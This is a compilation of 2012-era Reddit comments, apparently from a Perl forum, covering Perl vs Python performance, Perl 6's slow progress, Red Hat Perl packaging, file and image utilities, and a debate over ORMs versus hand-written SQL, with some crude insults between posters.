I disagree. If I was new to Perl I wouldn't want to wade through references and documentation until I found what I was looking for, I'd want a book or guide to take me through the language and actually teach me. I wasn't trying to reach a wide audience, I'm trying to help get the newer Perl6 converts up and running.
Hey, Perl is awesome :)
Congrats Ovid!
When JavaScript is run outside a browser environment, it usually is provided some kind of local file I/O library. There's also [a sandboxed File API](http://caniuse.com/#feat=fileapi) for browsers.
It hit me in the shower a while back: JavaScript is terrible when it's written like C, but not bad when written like Lisp.
&gt; It's not just that require returns a thing, it's that modules don't install themselves into a global namespace. Yes, that's what I should have said. Perl 6 sort of edged toward that idea, but I don't remember if it ever made it quite far enough. &gt; CommonJS modules don't have that problem because they exist only as closed-over lexical variables and as the return value from `require`. That's the same pattern I was able to push ClubCompy's code to use too. I wish it were a language feature and not merely a matter of convention among the enlightened.
Thank you :)
Brilliant! Just ordered my copy from Amazon. It is weird to see 'second hand' copies of a freshly minted book selling for a higher price.
I need to put up pages combining graphs and tables. HTNL5 is perfect, except, I have no way of getting info back to the calling program, short of running it all through a server.
These "used" copies are not even in the possession of the seller yet. Certain vendors order the book from the publisher and advertise it at considerably less than the publisher's price. They can afford to do this because the customer may then continue to buy books from them at a large mark up - books they buy for pennies can be sold on for tens of dollars. Other traders who do not have the book in stock will advertise it as if they have, describing it as being "pre-owned", but at a slightly higher price. They are trading on having a higher reputation, or a more prominent position in a search. Once a customer orders it from them they will buy it from the first vendor. This is done automatically by a script monitoring the other vendor's prices and stock. This leads to the paradoxical situation where a second hand copy can be more expensive than a new one. It was also the cause of the insane price wars where a script run by the first vendor would adjust the original price upwards in response, and the script run by the second vendor would do likewise, leading to runaway prices - sometimes in the tens of thousands of dollars. All this can happen before a single copy of a new book leaves the printer
Assuming that your requirements are a line-by-line join. That is, if you have: **File 1** A1 A2 A3 **File 2** B1 B2 B3 **File 3** C1 C2 C3 And you want: **Output** A1 B1 C1 A2 B2 C2 A3 B3 C3 The command line tool `paste` might be better suited to solving this. Here is the sample data and outputs: ~/files$ cat file1 A1 A2 A3 ~/files$ cat file2 B1 B2 B3 ~/files$ cat file3 C1 C2 C3 ~/files$ paste file1 file2 file3 A1 B1 C1 A2 B2 C2 A3 B3 C3 The output is, by default, delimited with tabs. `-d` lets you pick what you'd like for output. 
No problem. Have you considered reading [Modern Perl](http://modernperlbooks.com)?
Thanks - someone needed to do this. 
Agreed. It's been a very long time since I've seriously sat down and worked with perl so what I knew is probably very irrelevant now but I still have a big soft spot for perl and have been wanting to get back into it.
One thing that is great about Java (and C++ for that matter) is the fact that it is so strongly typed that an editor like Eclipse can use intellisense to assist you in picking methods to use on any particular class. Perl doesn't have that (so much). Which makes it a little scary. But not nearly as scary as JavaScript. Why? Because Perl has a strict mode. And because Perl has a compilation phase which can be utilised to syntax-check the code. Using JavaScript is taking risks left, right, and centre.
Hahahahahaha
No theory needed. this will account for the difference in speed.
My running of this test indicates that perl is just a little faster. The perl I'm using is 5.16 the python is 2.7.3. Several runs of my benchmark script indicate that the result is consistent. sh -v runbench time perl perl1 test.samples 3.11user 0.12system 0:03.24elapsed 99%CPU (0avgtext+0avgdata 777040maxresident)k 0inputs+8outputs (0major+50613minor)pagefaults 0swaps time perl perl2 test.samples 1.03user 0.02system 0:01.05elapsed 99%CPU (0avgtext+0avgdata 6240maxresident)k 0inputs+0outputs (0major+443minor)pagefaults 0swaps time python python1 test.samples 1.23user 0.01system 0:01.24elapsed 99%CPU (0avgtext+0avgdata 16928maxresident)k 0inputs+8outputs (0major+1187minor)pagefaults 0swaps original perl cat perl1 package main; use strict; use warnings; use autodie; use File::Slurp; Main(); sub Main { my $sample_file = 'test.samples'; my $samples = ReadSamples($sample_file); } sub ReadSamples { my ($file) = @_; my %samples; my @lines = read_file($file, chomp =&gt; 1); foreach my $line (@lines) { my ($seq, $seed, $sample_num, $k, $pos, $width, $t) = split(/ /, $line); $samples{$t}{$seq}++; } return \%samples; } single loop perl cat perl2 #! /usr/bin/perl open(IN, "test.samples") or die "Cannot open input file: test.txt\n"; my %samples = (); while(&lt;IN&gt;) { chomp; my ($seq, $seed, $sample_num, $k, $pos, $width, $t) = split(/ /, $line); ++$samples{$t}{$seq}; } close IN; exit; original python cat python1 from collections import defaultdict def ReadSamples(file): samples = defaultdict(lambda: defaultdict(lambda: 0)) f = open(file, 'r') for line in f: line = line.rstrip() words = line.split() samples[words[6]][words[0]] += 1 f.close() return samples def Main(): sample_file = 'test.samples' samples = ReadSamples(sample_file) Main() Data file generator perl -lE 'say "0 0 0 0 6 16 10" for (1..1512077)' &gt; test.samples Benchmark script cat runbench time perl perl1 test.samples time perl perl2 test.samples time python python1 test.samples EDITED: for format
I think I'll take yours as definitive, since you've been more thorough! My version of Perl is 5.14, which might account for the difference.
Thanks for all of the suggestions. I tried them. Here's the current version of the loop: open(my $fh, '&lt;', $file); while (&lt;$fh&gt;) { my ($seq, $t) = (split(/ /))[0,6]; $samples{$t}{$seq}++; } It's still slighly slower than the python version. 2.59s vs 1.91s. This isn't a practical problem, I'm just obsessing because I assumed perl would be faster. (I'm a perl fan) Now, NYTProf says most of the time is spent incrementing the hash. 
You alerted me to a typo I had actually, with &gt; using $_ a bit more That was the original intention, but I hadn't initialised $line, so it was actually splitting the empty string (a case for using "warnings", no doubt). I've fixed it above for reference. Regarding the split, would it be even more efficient to provide the number of fields as an extra argument? I'm not sure how "lazy" Perl is when using split, but that would directly stop it from going through the whole line when it reaches the sixth field, or do you know that it will adjust for that when you provide the array indices? Oh, and using the -&gt; operator in the hash, is that faster? Does Perl change $hash{"key"} to $hash-&gt;{"key"} internally? Surely that would only be a single step at compile time, rather than being done in each loop? Sorry for overloading the questions and the typo!
The same situation led me to use Python more. We had mongo .xml files to process (&gt;10M) and the stock XML parser in Python was 2 to 10 times faster than any of the XML parsers in Perl that I tried. I was shocked.
Did you try XML::LibXML? It's orders of magnitude faster than any pure Perl XML parsers.
Each line of your data file is identical. I don't know if that will make a big difference. You only have to initialize the hash for a single pair of keys.
Thanks! Had no idea about the paste command. I also got to add another term to my list of dirty sounding man pages ("man paste").
No, there are multiple values for different key pairs, e.g. pair {t=1, seq=27} might have 100 pairs while {t=2, seq=15} might have 11 values in the file. I was just thinking that in the data generator above, each row of the file is identical so the hash for the two (0 and 0) keys was only allocated once. I'm wonder if in this case if python is doing something more efficient for hash allocation. I don't know much about the internals of either language.
When someone uses the term "Modern Perl", do they really just mean "contemporary Perl", or is the phrase specific to some style or philosophy? 
It mostly just means "contemporary Perl". However, the term has a certain amount of gravitas because there's so much inertia behind Medieval Perl. If you pick up almost any book on Perl from a well-known publisher, it recommends using the two-argument form of open(), and it doesn't say anything about perlbrew or Moose, or anything from Perl 5.10 or later. If the supposedly authoritative books aren't going to teach newcomers that there's a big difference between Modern and Medieval Perl, then we the userbase have to.
To add to interiot's comment, it's a style of programming which takes advantage of the improvements in Perl 5 in recent years, from language enhancements to the CPAN to cultural discoveries.
So this is the new "Modern Perl" website? For a moment I thought someone hijacked modernperlbooks.com with bad design :) 
It's a list of resources and brief white papers. Is it really that ugly?
You need to post some example code.
Thanks but I got the answer from StackOverflow! :)
You, sir, may be a genius. Sorry for the delayed response, I got pulled off onto another project, but am focusing on this again now. I will PM you this weekend with what I have. 
It's a little weird looking. I'm not sure why, but it just looks a bit off to me. Is this site in git somewhere? Maybe people could take a stab at restyling it.
Ok, I think I know what irks me. It's the fact that content indents right after the top header, and the footer is not aligned with the top header. The whole thing looks like a poorly balanced tower. Also, a *little* more styling in general would make the site look less like something someone just whipped together one evening (which is what it is, I'm sure, but it doesn't need to look that way forever ;)
***scrottie***: &gt;[2012/10/05][11:00:08] &gt;[&amp;#91;Translate&amp;#93;](http://translate.google.com/#auto|auto|@CentOS Should I be yelling at @RedHat instead? Am I confused at how readily you accept responsibility for this clusterfuck? 'google translate this tweet'): [*@CentOS*](https://twitter.com/CentOS 'twitter user profile') Should I be yelling at [*@RedHat*](https://twitter.com/RedHat 'twitter user profile') instead? Am I confused at how readily you accept responsibility for this clusterfuck? ***CentOS***: &gt;&amp;#91;2012/10/05&amp;#93;&amp;#91;19:39:46&amp;#93; &gt;[&amp;#91;Translate&amp;#93;](http://translate.google.com/#auto|auto|@scrottie be happy to talk to you about your confusion. New to Linux I presume? 'google translate this tweet'): [*@scrottie*](https://twitter.com/scrottie 'twitter user profile') be happy to talk to you about your confusion. New to Linux I presume? [&amp;#91;This comment was posted by a bot&amp;#93;&amp;#91;FAQ&amp;#93;](http://www.reddit.com/r/tweet_poster/faq 'tweet_poster')[&amp;#91;Did I get it wrong?&amp;#93;](http://www.reddit.com/message/compose/?to=tweet_poster&amp;subject=Error%20Report&amp;message=[Oops!](http://reddit.com/r/perl/comments/110kv7\)%0d%0dPlease leave the subject and this link unaltered, but feel free to add a description here. 'report an error')
&gt; He's spent a few days complaining at CentOS for decisions they weren't involved in making, like which version of Perl got included. Bullshit. Next time read the timestamps as well. Scrottie got uncomfortable in tone after being told that his script needs to "gracefully" deal with random parts of perl core being missing and that it is "broken" if it cannot do that.
I don't know why you're surprised that RedHat-derived OS and Perl don't play well together. These are the same nitwits that "patched" `/usr/bin/perl` and broke it, remember.
[Perlbrew](http://perlbrew.pl) is the equivalent of virtualenv.
It's shitheads like this that give perl a bad name, and make companies like my employer want to move away from perl onto "more popular" languages like python or javascript. They're ruining it for everyone.
No, it's clean and functional. Less is more imho. As someone who increasingly browses on his phone these days, it rendered great and was easy to read.
@centos isn't the same lead dev as the time when you were dealing with him. But yes, they don't understand the perl way.
No, you have it backwards, m'lady.
@scrottie is a contributing douche, and your boss is a non-contributing douche. But stepping back for a moment, douchery as a phenomenon is universal, and it is this very douchery that is so appealing to your boss, who is mirroring the douchery he so admires. The reason he isn't feeling Perl is paradoxically, because of its low douchery. But in the end, if your boss doesn't understand Perl's advantages tech-wise and business-wise, then there's nothing you can do but maybe find another job, or wait for your boss' foolishness to get him moved elsewhere (fired, promoted, it's all the same) and then you can be the boss. One last Jungian note: you, a non-douche, call out scrottie as a douche, and thus you yourself become douchey. We are drawn to that which we lack, i.e., that which is our opposite, in order to obtain and integrate it. So you are now both the thing that you are (non-douche) and yet the thing that you loathe (douche), and it must be awkward.
Javascript: a not very well-designed language that I can do things with now. Perl 6: a language that I have no idea how well-designed it is, but that I know is totally different to Perl 5 and I can't use it now. I'm 54. Will I ever actually live to see Perl 6 in production?
Well, it comes down to this: Perl 6 gotta put up or shut up. [](http://example.com)^(P.S. JavaScript is dominating now, Go has arrived, and Rust is on the horizon.) 
&gt; Perl 6 gotta put up or shut up Languages come and go. Perl 6 will be "modern" enough ten years from now on without any problems.
Did you see the wink?
&gt; Go has arrived So? Why should that matter to Perl programmers?
I think Go sets a new standard for modern languages. It's compiled (I can distribute a single executable (per platform) that will just _work_), it's cross-platform, and takes care of packaging hell (by baking package management into the language). I really like Perl, but to make anything worthwhile you have to depend on CPAN. This is a good thing, because it's less work for you, but a bad thing, because deploying can be a bitch. Perl makes things easier for the developer, Go makes things easier for the end-user.
&gt; The reason I say vanilla Perl with no packages is, the package installer is broken. What you have there is RedHat Perl, not Vanilla Perl. Vanilla Perl works. Use a shell call to imagemagick and parse the output.
* What's the standard path to imagemagick? My system hasn't found it yet. * Does imagemagick return height in pixels? Points? Something else? 
imagemagick comes as a bunch of separate binaries. The command you want for this is `identify -verbose` which spits out a long list of stuff. Size in pixels is at the top on my version.
Fair enough, but I think all the hoops they're jumping through to make it an "easier transition" for Perl 5 users is also holding them back quite a bit.
No, because of their optimism. 
I don't know. It took until mid-2012 before the developers agreed "Maybe we should try to make it easier for people to keep their user code *running* on Perl 6."
I won't speak for anyone else, but *I* kept telling myself "It's only another few months away."
Did you mean Debian Sid, or did I not get the joke?
For a zero dependency, if fairly inefficient and low-tech way, you could always shell out to the 'file' utility. It gives you output like: UK.png: PNG image data, 256 x 256, 8-bit/color RGBA, non-interlaced USA.png: PNG image data, 256 x 256, 8-bit/color RGBA, non-interlaced Ukraine.png: PNG image data, 256 x 256, 8-bit/color RGBA, non-interlaced Uruguay.png: PNG image data, 256 x 256, 8-bit/color RGBA, non-interlaced Venezuela.png: PNG image data, 256 x 256, 8-bit/color RGBA, non-interlaced Easy to parse.
No, I really meant [Sarge](http://en.wikipedia.org/wiki/Debian#Release_history) which, at the time, seemed like it took forever to come out.
Most (I'd guess around 99%?) of commits by anyone other than Larry Wall for the last couple years have related to implementation, speeding it up, fixing users' problems, libraries, building out the ecosystem, documentation, and so on, not making changes to the language.
As you know (you have said you were there for the discussion), they agreed to try exactly that in 2009.
I also made overly optimistic predictions about Perl 6, though it seems I was much closer than chromatic and I separated prognostication from expectation. In August 2009 I said "I worry that you may have the wrong expectations ... as hard to stomach as it may be, the story remains, even though they've taken a decade to get this far, they may well take another year or two to be usable for limited production contexts and perhaps five to get to Perl 6.0.0 and a generally robust status." (Said [here](http://yesistilluseperl.blogspot.com/2009/08/parrot-even-runs-basic-programs.html?showComment=1249975161850#c6533761250394472828).) I think that was too optimistic. In particular, I didn't factor in Patrick Michaud, the Rakudo lead dev, suddenly spending far less time on Perl 6, for much of the last year or so (so far). I think they are still not quite where I had hoped they'd be a year ago. Fortunately for me I didn't make any big decisions based on expectations my prognostications were guaranteed to be accurate. (I made some small decisions, got burned, learned, and moved on.)
If you think Perl 5 was not well designed, you'll probably conclude Perl 6 isn't either. The question largely boils down to whether you like the way @Larry thinks. For me to properly answer your "in production" question you would need to be more specific. (Everyone has a different definition.) For example, if you mean reaching the sort of quality Perl 5 releases exhibit, well, Perl 6 isn't even in the game yet, and may not be for years to come. (A big issue is the degree to which the Perl 5 community chooses to embrace Perl 6, if at all.) If you mean bold folk taking the sorts of gamble that chromatic took, there's almost no one, though [Sir Robert is having a go](http://www.6ing.org/?p=6).
I like Javascript too. (I buy Crockford's portrayal of Javascript's design as being a sort of hurried hybrid of C syntax and Scheme and Self semantics). Perl 6 has less need for parens than Perl 5, at least for expressing things that Perl 5 can express. @Larry has put a lot of effort in to making Perl 6's design practical, at least in the same sense that Perl 5 could be considered to have a practical design.
I recall no guarantees of stability.
&gt; What is so wrong with Perl 5? I don't recall writing anything of that sort in my comment. Are you doing that thing again where you misquote people and argue with yourself?
Perl 6's design improves on Perl 5's in many areas and packages are supposed to be one of those areas. (Though, as Larry is fond of saying, it probably makes new mistakes. You can help reduce the mistakes by telling #perl6 what you think is important in the way it handles namespaces etc.) The Perl 6 design has a nice OO system. Aiui Moose was in large part a backport to Perl 5 of Perl 6's OO design (as it was in 2005). The Perl 6 design includes a lot of nuance related to what @Larry considered as data scientists' needs. The spec explicitly though very hand wavily covers PDL in particular: http://perlcabal.org/syn/S09.html#PDL_signatures but S09 is one of the biggest aspects of the Perl 6 spec that has not yet been tackled much by implementations (concurrency and Perl 5 being another two biggies). 
I am trying to figure out what problems you (or anyone else) can see with Perl 5 that suggest a need to pressure Perl 6 devs. (Fwiw I think Perl 5 is doing great.) I don't know if you care how I feel about your uncalled for insults, but I can assure you I find it hurtful and tiresome. You are a moderator of this reddit; I request that you behave civilly. In the meantime, I feel I need to put the record straight. I believe you've accused me of misquoting twice, and only twice. The last time was on this perl reddit. I politely corrected [your mistake](http://www.reddit.com/r/perl/comments/yipk4/notes_from_the_perl_reunification_summit_in_perl/c5yhg4z). The first time was on PerlMonks. You shocked me in to virtual Internet silence for months, until I realized that I had not actually done anything wrong; that fair folk do indeed regularly use quote marks the way I used them; that you saw in my actions malicious intent that was not there; and that it seems you yourself do the same thing: ["real people are using it in production now!"](http://www.perlmonks.org/?node_id=982673). I would appreciate your careful deliberation, perhaps a night's rest, and consideration of your role as a moderator, before responding to this comment (or not, as would be ideal I think).
&gt; I am trying to figure out what problems you ... can see with Perl 5. There's your problem right there. I wrote absolutely *nothing* about Perl 5 in that comment. This is the second time I've told you that in the past couple of hours. I don't know how to make that any clearer to you. You read something into my post that was very much not there, again, and you're going off on some wild tangent about something you imagined I said, again. I've *repeatedly* requested that you stop misquoting me and throwing up strawmen. Do you really think that's an effective way to convince people of your arguments? Do please kindly knock that off and you will find that your perception of civility will improve greatly.
There's [Image::Size](http://search.cpan.org/dist/Image-Size/lib/Image/Size.pm) as well, which has no dependencies, so again, if you can't install any modules, you could simply copyn'paste that code into your own.
http://search.cpan.org/~rjbs/perl-5.16.1/lib/File/Copy.pm
http://perldoc.perl.org/File/Copy.html
How can I copy a file? (contributed by brian d foy) Use the File::Copy module. It comes with Perl and can do a true copy across file systems, and it does its magic in a portable fashion. use File::Copy; copy( $original, $new_copy ) or die "Copy failed: $!"; EDIT: For future reference, you can search perlfaq with $ perldoc -q &lt;topic&gt; Searching for "copy" would have returned the above answer, along with an answer for copying a recursive data structure.
Even the best of us forget. In fact, I think I wrote my own filesystem recursion *while* using File::Copy a few years back. :\ Read is fundmental. Mostly mental.
&gt; Otherwise readers coming across such dialog will think that perhaps Perl 6 literally does not work or will literally never be production ready, hence driving participation down, the very thing that is a key reason it's taking so long. I find this argument very silly. Perl 6 is taking a long time because people who aren't working on it don't believe in it hard enough? I'll tell you (again) why I stopped working on it: I looked at the amount of work I faced to keep my code working and the amount of work I'd have to contribute to get Perl 6 to the point where it would be generally usable by my customers, and the opportunity costs there were far greater than my business could afford. I could either continue working on a project that wouldn't pay off for at least a year (and it's getting to multiple years now), or I could pay my mortgage. Easy choice. That decision had *nothing* to do with belief and everything to do with the actual state of Perl 6. That's why I don't get excited at the number of passing tests or the number of code snippets on Rosetta Code. *They don't pay my bills.* I don't care if you believe me, or if you think I'm some sort of horrible fire-breathing monster for finishing this sentence, but you should at least try to understand this: berating people for not believing what you want them to believe won't change the actual state of the code as it exists right now.
&gt; If people think that Perl 6 will happen, then I think they will be more likely to participate. I agree. I *disagree* that me writing about my experiences has a greater chilling effect than, for example, the fact that after twelve years there are no really practical Perl 6 implementations--especially given that I have always gone to great pains to make two points: * I'm not saying Perl 6 will *never* exist in a practical form * I *am* saying that it is not practical for *my* uses right now
Maybe I have the same problem. To me "there are no really practical Perl 6 implementations" is sufficiently equivalent to "it is not practical, right now, for anyone" that I can't see the difference. What am I missing?
&gt; What am I missing? The rest of my post, for one.
Because documentation says copy() returns 1 if successful. Documentation did not say this was a boolean value. 
&gt; Documentation did not say this was a boolean value. [It is.](http://perldoc.perl.org/perlsyn.html#Truth-and-Falsehood)
There is no* task sufficiently complex that there does not exist a perl command line to perform it \*Aside from the obvious halting problem, etc.
Your if/else is not needed. You can just do this: copy($file1, $file2) or die "Couldn't copy $file1 to $file2: $!\n"; If you don't want to die(), use warn(). The bonus with using die() is that you can check the script's exit status.
You're basically asking to learn programming, more than anything specific to Perl. I don't know if Perl is the greatest language to cut your teeth on, but really there are no bad languages in common use today. (Well, ignoring COBOL hehe.)
The nice thing about Go is that you distribute compiled binaries, rather than scripts. As an application publisher, I can hand out an executable that I know works, and is not dependent on the (sometimes quirky) state of the user's perl5/lib.
The only p5p reaction was to try the simpliest optimization, optimize taint resets, which gained 10% and crippled that idea it by removing taint support at all.
Twitter is no place to have an argument about anything, much less anything as complex as packaging.
Please do not use Switch.pm. It's a source filter, and will break in unexpected ways when you least expect it. Use a chain of if/elsif/else instead. Also, the first two cases of the original switch check for equality, your new regex will match any string containing "SF" or "SFV1" as a substring, such as "foobarSFbazquuz".
Considering the Perl version mentioned, you might want to take a look at: [perldoc perlsyn#Basic-BLOCKs](http://perldoc.perl.org/perlsyn.html#Basic-BLOCKs) SWITCH: for ($var) { if (/^(?:SF|SFV1|RLB|RLB2|RLBB2)$/) { $s = "Standard"; last SWITCH; } $s = "NOT FOUND"; }
You're giving us garbage input; there's no such thing as "Linux 5.8". The latest version of the kernel is 3.6.5. The oldest *supported* kernel is 3.0.x, for that matter. Please say what you're actually using. Also, a switch/given is huge overkill for this, you're already using a regex so just fold it into that: $s = ($val =~ / ^ SF (?:V1)? $ | RLB (?:2|B2)? /x) ? 'Standard' : 'NOT FOUND';
You're right. Linux is Redhat 5.5.56. I corrected my post.
Thanks for the heads up. I need this code to last 10-20 years or longer and run on multiple systems as we upgrade throughout the decades. I design programs to last decades, not months. 
There was no Red Hat 5.5.56, it skipped from 5.2 to 6. Do you mean Red Hat Enterprise Linux?
Are lookups constant time? How does that work?
WARNING, simplified timeline, things may be more complicated than I remember them being. Redhat had a consumer level distro called Redhat Linux. Then they decided to support enterprise users and created Redhat Linux Advanced Server and then RHEL. RHEL upgraded software more slowly than Redhat Linux, often lagging far behind (but with critical security patches backported) in the name of stable releases. Eventually they stopped paying as much attention to Redhat Linux as people wanted them to, so they created the community based Fedora Project which produces the Fedora Core distribution (which is kept fairly up to date).
In the case of hash collisions, they might not quite be constant time, but near enough to make no difference.
&gt;I need this code to last 10-20 years or longer Then why are you depending on features that are unlikely to be supported in the long run?
Yes, as long as you don't want to be able to have a `%lookup` value of `0` or `""` (empty string); those things are false and so `||` won't accept them as its LHS. Alternatives without this (potential) problem include: `$s = $lookup{$val} // 'NOT FOUND';` # requires perl 5.10 `$s = defined($lookup{$val}) ? $lookup{$val} : 'NOT FOUND';` # any perl version `$s = exists($lookup{$val}) ? $lookup{$val} : 'NOT FOUND';` # distinguishes between nonexistent key and undef.
http://en.wikipedia.org/wiki/Hash_table
Your 2nd example is not equivalent, because the string "SFV2" will match in the 2nd case but not the 1st. The simplest way to write that is: if ($val =~ /(RLB|RLB2|RLBB2)/ or $val eq "SF" or $val eq "SFV1") $s = "Standard"; else $s = "NOT FOUND"; The better way, if the matches are likely to change at all over the code's maintenance period, is to use a lookup table, as in allan_wind's reply. 
&gt;Which features are likely to be unsupported in the long run? Switch, which is already unsupported. &gt;Which features will be supported in the long run? [given/when](http://perltraining.com.au/tips/2008-03-12.html)
Are you using ZFS on Linux or a OpenSolaris distro? If so why LXC instead of Solaris Zones?
&gt; I haven't had a single feature suddenly go missing That was before the latest round of jackasses came to dominate the porters, as the old guard began to die off. SHITTY FEATURE BLOAT AND SENSELESS DEPRECATION FOR YOU MY FRIEND.
That sounds like fun. I haven't messed with iSCSI in quite a while. Here's how I set up a new LXC container's filesystem from an existing snapshot: zfs clone zpool0/zfs0/lxc/rev@now zpool0/zfs0/lxc/rev-&lt;ID&gt; zfs set quota=250M zpool0/zfs0/lxc/rev-&lt;ID&gt; Nothing too fancy. I have zpool0/zfs0/lxc mounted under /var/lib/lxc, and the Revolet backend sets up the config and fstab for the new container, then starts it. I do have issues sometimes with it taking a couple minutes to destroy a zfs clone after the container is stopped and all file handles are released.
Cool name! Was disappointed to find no link to documentation. Support for SQLite? 
Please post your latestfiles.pl code. 
Yes, SQLite is supported. Sorry for the scarce documentation. I'm working on the getting started guide and documentation this week. If you have any way to get on IRC I can walk you through setting up a project.
[latestfiles.pl code](http://sprunge.us/YCeT)
So I clearly don't really use these modules, but just from a glance it looks like you're calling a method that doesn't exist in MP3::Tag. You can only call add_plugin on a Music::Tag object.
You were right. I was calling add_plugin on a MP3::Tag object instead of Music::Tag
I don't like using ORMs or SQL builders like SQL::Abstract. They seem to do fine when the needs are simple, but there's no trick to making simple things simple. Once you need to do a three table join with a subselect, getting the incantation right for the abstraction layer is hard, but I already know how the SQL ought to look. The abstraction layer is demonstrably making my job harder. (Same problem XML::Simple has; after an afternoon of trying to get the datastructure to come out the way I expect, I realize I would have been done already if I had used a DOM parser.)
I just don't find that the ORM does that in practice. SQL is already an abstraction layer over whatever the database does internally. Often, I already know what the SQL should look like, or can easily figure it out from the vender documentation. With an additional abstraction layer, I now have to think about hitting the right settings to generate the SQL that I already knew how to do myself. The extra abstraction is nothing more than an additional layer of indirection. Plus, a lot of the SQL that ORMs generate is really poorly optimized. Like running two separate statements when one statement with a join would have been better. In theory, they could do better, but that starts to look like the Sufficiently Optimized Compiler Fallacy.
You can still keep your SQL in one place. That's just a matter of how you structure your classes. I haven't found any method that I'm completely happy with here, but the one I've settled on for now is to have one big class with methods that access the database logically: sub get_prods_by_price_range { my $sql = 'SELECT * FROM prods WHERE price &lt; ? AND price &gt; ?'; ... } sub get_prod_by_id { my $sql = 'SELECT * FROM prods WHERE id = ?'; ... } And so on (specifying the fields out rather than using `SELECT *`, of course). You can think of these as database procedures that are implemented around the database rather than inside it. If you need to support multiple RDBMS backends, then you can structure things as: MyApp::DB MyApp::DB::MySQL MyApp::DB::Pg MyApp::DB::Oracle And so on, with each vender class being a subclass of `MyApp::DB`. The superclass can directly implement the methods that can be done with generic SQL, while subclasses take care of all vender-specific stuff as needed. `MyApp::DB` constructor can take a `vender` argument and return the right subclass (factory pattern, more or less). You can stick an SQL generator like `SQL::Abstract` in there if you want, but I don't care for them. This does tend to create a God Object anti-pattern, which is why I'm still not happy with this method. I just prefer it to most of the alternatives in complex database applications.
Crazy idea, try actually using a modern perl ORM like DBIx::Class, you'll write less code and the code you do write will be clearer and more standardised and thus more maintainable and easier to document for somebody else. A decade or so ago your claim about ORMs generating inefficient SQL may have been true in some cases, but these days they are very efficient if you use them at all sensibly (to the point of some benchmarks showing DBIx::Class with hashref inflated results beating raw DBI) - if your ORM is producing slow results these days it's because you didn't RTFM.
As I said, I'm not totally happy with this model. I just tolerate its slight tendency towards being a [God Object](https://en.wikipedia.org/wiki/God_object) over the strong ORM tendendcy to make an [Object Orgy](https://en.wikipedia.org/wiki/Object_orgy). (Specifically, the getter/setters on ORMs are being mistaken for a feature.)
yes, depending on the database and the joins you want it can be a lot better than specifying every specific join every time, as the ORM will know what kind of join and what what constraint you're joining on, the joins can be named clearly and make for a very easy to write and maintain codebase. While you're busy futzing around writing SQL by hand and reinventing the sql generation wheel badly with no unit tests or documentation I'll have my ORM and be implementing new features and putting higher level caching in front so it'll do more and be faster while you're debugging and tuning you hand-rolled version
I haven't seen any evidence of any of the perl ORMs I've worked with creating or encouraging that anti-pattern, that's in about 8 years of coding with a variety of perl ORMs on a variety of codebases. 
&gt; Encapsulation may be weakened by declaring internal members public or by providing free access to data *via public getter/setter methods* Emphasis added. Throwing accessors/mutators around your object means that you wanted a simple data structure, not an object.
Not really no, I want stuff out of it, some of it will be attributes some of it will be methods that provide something else or do something else. If I wanted a simple data structure, in DBIC for instance I could specify I wanted one and that's very rare. Experience trumps somebody's opinion that they've put in wikipedia in my book.
To counter an Attack on the Source with an Appeal to Authority, [would you believe Merlyn](http://www.perlmonks.org/?node_id=309956)? Or how about any of these: * http://www.javaworld.com/javaworld/jw-09-2003/jw-0905-toolbox.html * http://c2.com/cgi/wiki?AccessorsAreEvil * http://martinfowler.com/bliki/GetterEradicator.html Object methods are for performing complex behavior underneath logical calls. When you spew accessors/mutators all over them, that complex behavior is allowed to leak into the rest of the application. (Consolidating the separate conversation threads below.) &gt; I've worked with codebases that were done your way, and that was my experience. And I've worked on codebases done all the other ways, and this was my experience. For the record, of all these ways: * Ad hoc hand written * Hand written wrapped in a God Object * ORM * Abstract SQL builder * Database procedures for everything I consider all of them terrible. The first is obviously the worst once you get larger than a single script, and the rest are used because we don't have a better idea yet. The last one means the vender turned SQL into a full programming language with procedure calls, and that extended language is invariably worse than whatever real programming language you're using on top. It also tends to need more careful communication between your DBAs and Programmers. (If a DBA were to reply here, they'd probably say that Programmers don't know how to write SQL, be it from an ORM or by hand. If we let them send arbitrary SQL to the database, they're bound to screw it up. Therefore, you'll need good communication between DBAs and Programmers, anyway. I tend to disagree; Programmers can write simple SQL just fine, but forcing them to go through a procedure call means that the easy jobs are no longer easy. It's only the harder jobs where we need the DBAs, e.g. for making sure the indexes are being hit correctly.) So that leaves the middle three, and I think all of them suck (and yes, I have dealt with all of them to some degree or another). I just think "hand written wrapped in a God Object" is the least suck. &gt; . . . I'm countering it based on pretty solid commercial experience on some large projects with some household names. If you want to get all Appeal to My Authority, then I've worked under a Fortune 500 for over 7 years, doing ecommerce sites that cover several brands in several countries, plus a few years of other professional Perl before that. So what? The fact that different people with the same level of experience can come to different conclusions is why Appeal to Authority, including your own Authority, is a fallacy. If I was going to use an ORM, it'd be DBIx::Class; it's a clear improvement over Class::DBI. I just have some fundamental issues with the entire idea of ORMs, and I don't find that they actually make the code shorter or more understandable, either. When I need carefully optimized SQL (the kind where I go ask a DBA for advice, because that's what they're for), then they tend to get in the way. When I need to access a lot of database procedures rather than standard SQL (because that's what the DBAs insisted on, despite my protests), then they tend to get in the way. When I want to think about my database access in terms of logical operations (which is nearly always), then they provide little to nothing over hand-written SQL. If we were talking about an ORM that had a sophistication on the level of a good optimizing C compiler, then that might really be something. I doubt there's an ORM anywhere for any language at that level. I suspect DBAs would be mostly out of a job if there ever were, just like there's only a limited demand for programmers who can hand-optimize ASM. I also suspect its interface would have a much more sophisticated abstraction to match, on the order of the difference between C and raw ASM.
He writes that like he's proud of it, and deserves a cookie. He doesn't deserve a cookie. And eww, his prose is all over the place.
I wasn't attacking the source, I was calling you out for claiming something was objective when it was subjective - a couple of authorities think of accessors as a "code smell" - that's not a real metric like say "cyclic complexity" that McCabe proved affected code quality and maintainability, more importantly "code smell" is just an indicator that there "may" be a problem - after all the level of test and documentation coverage in DBIx::Class is very high - I'd trust a history of tests and rapid fixes over what is essentially a subjective hunch, even if it was Damien Conway or MJD, so that appeal to authority doesn't impress me much ;) From what I can make out from your experience - your initial claim of "I can do better by hand" turns out to be "ORMs can be the least worst option" - I don't think you're going to get a lot of disagreement on that score LOL. However your claims about and ORM like DBIx::Class "not making code clearer or shorter" show that you either don't know enough about the tool or haven't used it sufficiently, as does your claim they get in the way - you just need to RTFM, and learn the damn tool - maybe if you stopped grumbling about how "fundamentally wrong" they were you'd find that your apprehension is misplaced.
